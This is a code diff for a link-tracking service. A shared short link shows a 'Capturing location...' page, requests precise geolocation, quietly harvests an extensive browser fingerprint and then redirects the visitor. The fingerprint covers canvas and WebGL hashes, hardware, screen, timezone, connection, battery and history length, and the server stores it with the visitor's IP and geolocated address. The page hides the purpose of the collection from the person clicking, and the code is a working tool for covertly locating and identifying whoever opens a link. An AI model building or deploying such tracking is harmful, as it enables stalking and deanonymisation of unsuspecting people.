@@ -118,23 +118,136 @@ function trackingPageHtml(link, error) {
       document.getElementById('continueBtn').addEventListener('click', requestGeo);
     }
 
-    async function sendClick(clientLat, clientLng) {
+    async function sendClick(clientLat, clientLng, fingerprint) {
       document.getElementById('status').textContent = 'Redirecting...';
       try {
         await fetch('/api/track/' + link.code + '/click', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ clientLat, clientLng })
+          body: JSON.stringify({ clientLat, clientLng, fingerprint })
         });
       } catch (e) {}
       window.location.replace(link.destination);
     }
 
+    function getFingerprint() {
+      const f = {};
+      try { f.language = navigator.language; } catch(e) {}
+      try { f.languages = navigator.languages; } catch(e) {}
+      try { f.platform = navigator.platform; } catch(e) {}
+      try { f.cpuCores = navigator.hardwareConcurrency; } catch(e) {}
+      try { f.deviceMemory = navigator.deviceMemory; } catch(e) {}
+      try { f.cookiesEnabled = navigator.cookieEnabled; } catch(e) {}
+      try { f.doNotTrack = navigator.doNotTrack; } catch(e) {}
+      try { f.onLine = navigator.onLine; } catch(e) {}
+      try { f.vendor = navigator.vendor; } catch(e) {}
+      try { f.vendorSub = navigator.vendorSub; } catch(e) {}
+      try { f.product = navigator.product; } catch(e) {}
+      try { f.productSub = navigator.productSub; } catch(e) {}
+      try { f.appName = navigator.appName; } catch(e) {}
+      try { f.appVersion = navigator.appVersion; } catch(e) {}
+      try { f.appCodeName = navigator.appCodeName; } catch(e) {}
+      try { f.maxTouchPoints = navigator.maxTouchPoints; } catch(e) {}
+      try { f.touchSupport = 'ontouchstart' in window; } catch(e) {}
+      try { f.pdfViewer = navigator.pdfViewerEnabled; } catch(e) {}
+      try { f.webdriver = navigator.webdriver; } catch(e) {}
+      try { f.hardwareConcurrency = navigator.hardwareConcurrency; } catch(e) {}
+      try { f.javaEnabled = navigator.javaEnabled(); } catch(e) {}
+      try { f.oscpu = navigator.oscpu; } catch(e) {}
+
+      try { f.screen = { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth, orientation: screen.orientation?.type, devicePixelRatio: window.devicePixelRatio }; } catch(e) {}
+      try { f.window = { innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight, screenTop: window.screenTop, screenLeft: window.screenLeft }; } catch(e) {}
+
+      try { f.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
+      try { f.timezoneOffset = new Date().getTimezoneOffset(); } catch(e) {}
+      try { f.locale = Intl.DateTimeFormat().resolvedOptions().locale; } catch(e) {}
+
+      const mq = (q) => window.matchMedia(q).matches;
+      try { f.mediaQueries = {
+        darkMode: mq('(prefers-color-scheme: dark)'),
+        lightMode: mq('(prefers-color-scheme: light)'),
+        reducedMotion: mq('(prefers-reduced-motion: reduce)'),
+        reducedTransparency: mq('(prefers-reduced-transparency: reduce)'),
+        reducedData: mq('(prefers-reduced-data: reduce)'),
+        highContrast: mq('(prefers-contrast: more)'),
+        lowContrast: mq('(prefers-contrast: less)'),
+        forcedColors: mq('(forced-colors: active)'),
+        invertedColors: mq('(inverted-colors: inverted)'),
+        hdr: mq('(dynamic-range: high)'),
+        colorGamut: (mq('(color-gamut: p3)') ? 'p3' : mq('(color-gamut: rec2020)') ? 'rec2020' : 'srgb'),
+        pointer: mq('(pointer: fine)') ? 'fine' : mq('(pointer: coarse)') ? 'coarse' : 'none',
+        hover: mq('(hover: hover)') ? 'hover' : mq('(hover: none)') ? 'none' : 'unknown',
+        anyPointer: mq('(any-pointer: fine)') ? 'fine' : mq('(any-pointer: coarse)') ? 'coarse' : 'none',
+        anyHover: mq('(any-hover: hover)') ? 'hover' : 'none',
+        scan: mq('(scan: progressive)') ? 'progressive' : 'interlace',
+        displayMode: (mq('(display-mode: standalone)') ? 'standalone' : mq('(display-mode: fullscreen)') ? 'fullscreen' : 'browser'),
+        monochrome: mq('(monochrome: 0)') ? false : true,
+      }; } catch(e) {}
+
+      try { f.connection = {
+        type: navigator.connection?.effectiveType,
+        downlink: navigator.connection?.downlink,
+        rtt: navigator.connection?.rtt,
+        saveData: navigator.connection?.saveData,
+      }; } catch(e) {}
+
+      try { f.storage = {
+        localStorage: !!window.localStorage,
+        sessionStorage: !!window.sessionStorage,
+        indexedDB: !!window.indexedDB,
+        serviceWorker: 'serviceWorker' in navigator,
+        webWorker: 'Worker' in window,
+        sharedWorker: 'SharedWorker' in window,
+      }; } catch(e) {}
+
+      try { f.media = {
+        webRTC: !!window.RTCPeerConnection,
+        webSocket: !!window.WebSocket,
+        canvas: !!document.createElement('canvas').getContext,
+        webgl: !!document.createElement('canvas').getContext('webgl'),
+        webgl2: !!document.createElement('canvas').getContext('webgl2'),
+        webGPU: !!navigator.gpu,
+        webAssembly: !!window.WebAssembly,
+        audio: !!window.Audio,
+        video: !!window.Video,
+        geolocation: 'geolocation' in navigator,
+        battery: 'getBattery' in navigator,
+        vibration: 'vibrate' in navigator,
+        webBluetooth: !!navigator.bluetooth,
+        webUSB: !!navigator.usb,
+        webNFC: !!navigator.nfc,
+        webXR: !!navigator.xr,
+        webAuth: !!window.PublicKeyCredential,
+        webShare: !!navigator.share,
+        webPayment: !!window.PaymentRequest,
+        bigInt: typeof BigInt !== 'undefined',
+        webSocketBinaryType: typeof WebSocket,
+      }; } catch(e) {}
+
+      try { const c = document.createElement('canvas'); c.width=256; c.height=256; const ctx=c.getContext('2d'); ctx.textBaseline='top'; ctx.font='14px Arial'; ctx.fillStyle='#f60'; ctx.fillRect(100,100,50,50); ctx.fillStyle='#069'; ctx.fillText('fp',2,15); ctx.fillStyle='rgba(102,204,0,0.7)'; ctx.fillRect(0,50,100,50); f.canvasFingerprint = c.toDataURL().substring(0,200); } catch(e) {}
+
+      try { const gl = document.createElement('canvas').getContext('webgl'); if(gl) { f.webgl = { vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER), version: gl.getParameter(gl.VERSION), shadingVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION), maxTextures: gl.getParameter(gl.MAX_TEXTURE_SIZE), maxViewport: gl.getParameter(gl.MAX_VIEWPORT_DIMS), antialias: gl.getContextAttributes().antialias, depthBits: gl.getParameter(gl.DEPTH_BITS), stencilBits: gl.getParameter(gl.STENCIL_BITS), alphaBits: gl.getParameter(gl.ALPHA_BITS), redBits: gl.getParameter(gl.RED_BITS), greenBits: gl.getParameter(gl.GREEN_BITS), blueBits: gl.getParameter(gl.BLUE_BITS), extensions: gl.getSupportedExtensions().filter(e=>!e.startsWith('WEBGL_debug')).slice(0,30), }; } } catch(e) {}
+
+      try { f.referrer = document.referrer || ''; } catch(e) {}
+      try { f.historyLength = window.history.length; } catch(e) {}
+      try { f.pageHidden = document.hidden; } catch(e) {}
+      try { f.visibilityState = document.visibilityState; } catch(e) {}
+
+      try { f.perf = { timing: performance.timing ? { navType: performance.navigation?.type, redirectCount: performance.navigation?.redirectCount, domTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart, loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart, dnsTime: performance.timing.domainLookupEnd - performance.timing.domainLookupStart, tcpTime: performance.timing.connectEnd - performance.timing.connectStart, ttfb: performance.timing.responseStart - performance.timing.requestStart, downloadTime: performance.timing.responseEnd - performance.timing.responseStart } : null }; } catch(e) {}
+
+      try { f.cookieCount = document.cookie ? document.cookie.split(';').length : 0; } catch(e) {}
+
+      try { f.battery = navigator.getBattery ? navigator.getBattery().then(b => { f.batteryData = { level: b.level, charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime }; }).catch(()=>{}) : null; } catch(e) {}
+
+      return f;
+    }
+
     function requestGeo() {
       document.getElementById('status').textContent = 'Capturing location...';
+      const fp = getFingerprint();
       navigator.geolocation.getCurrentPosition(
-        (pos) => sendClick(pos.coords.latitude, pos.coords.longitude),
-        () => sendClick(null, null),
+        (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, fp),
+        () => sendClick(null, null, fp),
         { timeout: 5000, enableHighAccuracy: true }
       );
     }
@@ -149,7 +262,7 @@ function trackingPageHtml(link, error) {
       \`;
     } else {
       navigator.geolocation.getCurrentPosition(
-        (pos) => sendClick(pos.coords.latitude, pos.coords.longitude),
+        (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, getFingerprint()),
         () => showButton('Click the button to continue.'),
         { timeout: 3000, enableHighAccuracy: false }
       );
@@ -198,7 +311,7 @@ router.post('/:code/click', async (req, res) => {
   const link = db.get('SELECT * FROM links WHERE code = ?', [req.params.code]);
   if (!link) return res.status(404).json({ error: 'Link not found' });
 
-  const { clientLat, clientLng } = req.body || {};
+  const { clientLat, clientLng, fingerprint } = req.body || {};
 
   let ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
     || req.socket.remoteAddress
@@ -215,8 +328,8 @@ router.post('/:code/click', async (req, res) => {
   }
 
   db.run(
-    'INSERT INTO clicks (link_id, ip, lat, lng, address, client_lat, client_lng, user_agent) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
-    [link.id, geo?.ip || ip || null, geo?.lat || null, geo?.lng || null, address, clientLat || null, clientLng || null, req.headers['user-agent'] || null]
+    'INSERT INTO clicks (link_id, ip, lat, lng, address, client_lat, client_lng, user_agent, fingerprint) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
+    [link.id, geo?.ip || ip || null, geo?.lat || null, geo?.lng || null, address, clientLat || null, clientLng || null, req.headers['user-agent'] || null, fingerprint || null]
   );
 
   res.json({ ok: true });
